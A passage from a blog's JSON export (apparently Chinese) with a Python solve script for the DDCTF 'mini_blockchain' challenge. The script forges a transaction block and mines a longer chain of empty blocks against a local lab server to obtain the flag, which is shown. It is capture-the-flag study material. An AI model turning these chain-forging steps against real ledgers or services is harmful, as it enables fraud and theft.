builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_tx</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span>\n                              <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'output'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">pubkey_to_address</span><span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> pubkey<span class=\"token punctuation\">.</span>e <span class=\"token operator\">==</span> <span class=\"token number\">65537</span>\n    hexed <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> hexed<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> hexed <span class=\"token operator\">=</span> hexed<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> hexed<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> hexed <span class=\"token operator\">=</span> hexed<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> hexed\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_addr_key_pair</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pubkey<span class=\"token punctuation\">,</span> privkey <span class=\"token operator\">=</span> rsa<span class=\"token punctuation\">.</span>newkeys<span class=\"token punctuation\">(</span><span class=\"token number\">384</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> pubkey_to_address<span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pubkey<span class=\"token punctuation\">,</span>privkey\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">pow_work</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> difficulty<span class=\"token punctuation\">,</span> msg<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    nonce <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> nonce <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span>\n        block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nonce<span class=\"token punctuation\">)</span>\n        block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_block<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span>\n        block_hash <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> block_hash <span class=\"token operator\">&lt;</span> difficulty<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> block\n        nonce <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">emptyBlock</span><span class=\"token punctuation\">(</span>prevHash<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    block <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prevHash\n    block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> pow_work<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> DIFFICULTY<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">fmt_block</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">fill_transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    utxo <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'addr'</span><span class=\"token punctuation\">:</span> shop_addr<span class=\"token punctuation\">,</span> <span class=\"token string\">'amount'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">&#125;</span>\n    utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_utxo<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">)</span>\n    tx <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>INPUT<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'signature'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>SIGNATURE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'output'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span>\n    tx<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_tx<span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>tx<span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">headers</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"Host\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"127.0.0.1:9999\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Upgrade-Insecure-Requests\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Accept\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Accept-Language\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"zh-CN,zh;q=0.8\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"session=&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Connection\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"close\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/json\"</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> headers\n\nblock1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\nblock1<span class=\"token punctuation\">[</span><span class=\"token string\">\"prev\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> genesis_block\nblock1<span class=\"token punctuation\">[</span><span class=\"token string\">\"transactions\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fill_transaction<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nblock1 <span class=\"token operator\">=</span> pow_work<span class=\"token punctuation\">(</span>block1<span class=\"token punctuation\">,</span> DIFFICULTY<span class=\"token punctuation\">)</span>\nact1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\"</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>fmt_block<span class=\"token punctuation\">(</span>block1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act1<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act1<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span>\n\nsession2 <span class=\"token operator\">=</span> act1<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nblock2 <span class=\"token operator\">=</span> emptyBlock<span class=\"token punctuation\">(</span>block1<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"empty2\"</span><span class=\"token punctuation\">)</span>\nact2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\"</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>fmt_block<span class=\"token punctuation\">(</span>block2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act2<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n\nsession3 <span class=\"token operator\">=</span> act2<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nblock3 <span class=\"token operator\">=</span> emptyBlock<span class=\"token punctuation\">(</span>block2<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"empty3\"</span><span class=\"token punctuation\">)</span>\nact3 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\"</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>fmt_block<span class=\"token punctuation\">(</span>block3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act3<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n\nsession4 <span class=\"token operator\">=</span> act3<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nblock4 <span class=\"token operator\">=</span> emptyBlock<span class=\"token punctuation\">(</span>block3<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"empty4\"</span><span class=\"token punctuation\">)</span>\nact4 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\"</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>fmt_block<span class=\"token punctuation\">(</span>block4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act4<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n\nsession5 <span class=\"token operator\">=</span> act4<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nblock5 <span class=\"token operator\">=</span> emptyBlock<span class=\"token punctuation\">(</span>block4<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"empty5\"</span><span class=\"token punctuation\">)</span>\nact5 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\"</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>fmt_block<span class=\"token punctuation\">(</span>block5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>act5<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n\nsession6 <span class=\"token operator\">=</span> act5<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nresult<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:9999/b9ca5f959dd7e/flag\"</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>session6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行程序</p>\n<p>照着rep.text天蝎对应的input，获得运行结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221202213254840.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flag：Here is your flag: DDCTF&#123;B10cKch@iN_15_FuN_e53ff95faed&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","feature":true,"text":"0x01 challenge docker run -it -p 5000:5000 chainflag&#x2F;mini_blockchain &#x2F;&#x2F;运行题目 0x02 source codeServe.py# -*- encoding: utf-8 -*-...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":13,"path":"api/tags/区块链-ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01-challenge\"><span class=\"toc-text\">0x01 challenge</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x02-source-code\"><span class=\"toc-text\">0x02 source code</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Serve-py\"><span class=\"toc-text\">Serve.py</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Block-json\"><span class=\"toc-text\">Block.json</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03-analyse\"><span class=\"toc-text\">0x03 analyse</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x04-Attack\"><span class=\"toc-text\">0x04 Attack</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/337861699266393_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"real world ctf 2023","uid":"e11ae42b703d221b2129f06adb945d20","slug":"real-world-ctf-HappyFactory","date":"2023-01-07T18:35:13.555Z","updated":"2023-01-08T13:03:52.698Z","comments":true,"path":"api/articles/real-world-ctf-HappyFactory.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/banner2023-1.jpg","text":"HappyFactory0x01 Intro题目的漏洞倒是不难，考察了变版的UniswapV2倒是有一处卡了好久。。。等下分析题目时说一下 0x02 Code Click to see more 附件合约 /** *Submitted for verification at Et...","link":"","photos":[],"count_time":{"symbolsCount":"50k","symbolsTime":"45 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/337861699266393_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"D3Casino","uid":"0bc01c9baa6ed7d9670d639e41514b1a","slug":"D3CTF","date":"2023-05-08T17:06:14.035Z","updated":"2023-05-08T17:17:09.590Z","comments":true,"path":"api/articles/D3CTF.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/main_2023.05885330.jpg","text":"D3CTF的一道题，比赛过程中把29计算成了0x1c，导致直到比赛结束后多日才复现出来，话不多说来看一下题 0x01 Codepragma solidity 0.8.17; contract D3Casino&#123; uint256 constant mod = 17; ui...","link":"","photos":[],"count_time":{"symbolsCount":"4.9k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/337861699266393_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}